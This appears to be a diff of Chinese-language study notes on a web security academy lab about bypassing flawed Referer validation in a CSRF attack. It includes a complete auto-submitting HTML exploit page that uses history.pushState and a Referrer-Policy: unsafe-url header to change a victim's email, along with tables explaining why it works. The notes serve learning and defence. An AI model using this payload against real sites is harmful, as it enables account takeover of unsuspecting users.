+```
+Referrer-Policy: unsafe-url
+```
+
+> 注意：`Referrer` 在 HTTP 头中的拼写是三个 r。
+
+`unsafe-url` 策略强制浏览器发送完整 URL（包括路径和查询参数）。即使浏览器默认会裁剪，攻击者也能确保包含目标域名的完整 URL 被发出。
 
 ---
 
-### Referer 验证可以被规避
+#### Lab 实战：带有损坏的 Referer 验证的 CSRF
 
-**缺陷：** 应用程序以可被绕过的简单方式验证 Referer 头。例如：
+**场景：** 电子邮件更改功能存在 CSRF 漏洞。应用程序通过检查 Referer 头来防御跨域请求，但验证逻辑存在缺陷——只要 Referer 中**包含**目标域名即放行，而非精确匹配来源。
 
-- **仅验证域名前缀：** 如果应用程序验证 Referer 中的域名以预期值**开头**，攻击者可以将其作为子域名放置：
+**测试过程：**
 
-  ```
-  http://vulnerable-website.com.attacker-website.com/csrf-attack
-  ```
+1. 登录自己的账户，提交"更新电子邮件"表单，在代理历史中找到请求
+2. 将请求发送到 Burp Repeater，修改 Referer 头中的域名为任意值——请求被拒绝
+3. 将目标域名以查询字符串形式附加到 Referer 中：
+   ```
+   Referer: https://arbitrary-incorrect-domain.net?your-lab-id.web-security-academy.net
+   ```
+4. 发送请求，被接受。服务器只检查 Referer 中是否**包含**预期域名
 
-- **仅验证包含域名：** 如果应用程序仅验证 Referer 是否**包含**自己的域名，攻击者可以将所需值放在 URL 的其他位置：
+##### 两个攻击脚本的对比
 
-  ```
-  http://attacker-website.com/csrf-attack?vulnerable-website.com
-  ```
+**能绕过验证的脚本：**
 
-**注意：** 为了减少敏感数据泄露的风险，许多浏览器现在默认从 Referer 头中去除查询字符串。可以通过确保包含利用的响应设置了 `Referrer-Policy: unsafe-url` 头来覆盖此行为（注意此处 Referrer 的拼写是**三个 r**），以确保完整 URL（含查询字符串）被发送。
+```html
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Referrer-Policy: unsafe-url
+<html>
+  <body>
+  <script>history.pushState('', '', '/?0af8...web-security-academy.net')</script>
+    <form action="https://0af8...web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="wiener11@normal-user.net" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+**不能绕过的脚本：**
+
+```html
+<html>
+  <body>
+    <form action="https://0af8...web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="wiener11@normal-user.net" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+##### 核心区别逐项对比
+
+| 对比项 | 能绕过的脚本 | 不能绕过的脚本 |
+|--------|------------|--------------|
+| `history.pushState` 的第三个参数 | `'/?0af8...目标域名'` | `'/'` |
+| 执行后地址栏显示的 URL | `https://exploit-server.net/?目标域名` | `https://exploit-server.net/` |
+| 表单提交时带的 Referer 头 | `https://exploit-server.net/?目标域名` | `https://exploit-server.net/` |
+| 服务器检查 Referer 时发现 | 包含了目标域名，放行 | 只有 exploit-server.net，不含目标域名 |
+| 验证结果 | 绕过成功 | 被拦截 |
+
+**原理：** 服务器只检查 Referer 里有没有自己的域名。第二段代码的 Referer 是 `https://exploit-server.net/`，里面没有目标域名，请求被拒绝。第一段代码用 `history.pushState` 把目标域名当作查询参数拼在 URL 后面，提交表单时 Referer 变成了 `https://exploit-server.net/?目标域名`，服务器发现包含自己的域名，放行。
+
+##### `history.pushState` 在这里的作用
+
+`history.pushState(state, title, url)` 是浏览器 History API，只改变地址栏显示的 URL，**不刷新页面**：
+
+- 第一个参数 — 状态对象（这里不需要，留空）
+- 第二个参数 — 标题（浏览器基本忽略，留空）
+- 第三个参数 — **新的 URL 路径**，这是关键
+
+两种用法在攻击中的不同效果：
+
+| 用法 | 效果 |
+|------|------|
+| `history.pushState('', '', '/')` | 地址栏变成 `https://exploit-server.net/`，隐藏攻击路径，增加隐蔽性 |
+| `history.pushState('', '', '/?目标域名')` | 地址栏变成 `https://exploit-server.net/?目标域名`，提交表单时 Referer 携带目标域名，绕过验证 |
+
+**一句话：** 把目标域名塞进自己 URL 的查询参数里，表单提交时浏览器把整个 URL 作为 Referer 发出去，服务器一看"里面有我的域名"，放行。
+
+##### `Referrer-Policy: unsafe-url` 的作用
+
+现代浏览器默认会从 Referer 头中剥离查询字符串（隐私保护），所以光用 `history.pushState` 把域名塞进查询参数还不够——浏览器发 Referer 时会把它去掉。
+
+在漏洞利用服务器响应中加上：
+
+```
+Referrer-Policy: unsafe-url
+```
+
+这个头告诉浏览器："本次请求发送完整的 URL，包括查询字符串"。这样藏在参数里的目标域名才能被送到服务器。
+
+> 注意：HTTP 头中 `Referer` 拼写是三个 r（历史原因留下的拼写错误），但 `Referrer-Policy` 头中 `Referrer` 是正确拼写（四个 r）。这是两个不同的头，不要混淆。
+
+##### 完整攻击流程
+
+1. 在漏洞利用服务器上托管 HTML 页面
+2. 用 `history.pushState` 将目标域名写入当前 URL 的查询参数
+3. 在服务器响应头中设置 `Referrer-Policy: unsafe-url`，确保浏览器发送完整 URL
+4. 表单提交时，Referer 头变为 `https://exploit-server.net/?目标域名`
+5. 服务器检查 Referer，发现包含自己的域名，验证通过
+6. 受害者的邮箱被修改
+
+### 总结
+
+这两种绕过之所以能成功，根源在于：
+
+1. **服务器验证逻辑不严谨** — 容忍 Referer 缺失，或校验方式过于宽松（前缀/包含而非精确匹配）
+2. **开发者过于信任浏览器行为** — 认为浏览器一定会带 Referer，且 Referer 一定真实、完整
 
 ---
 
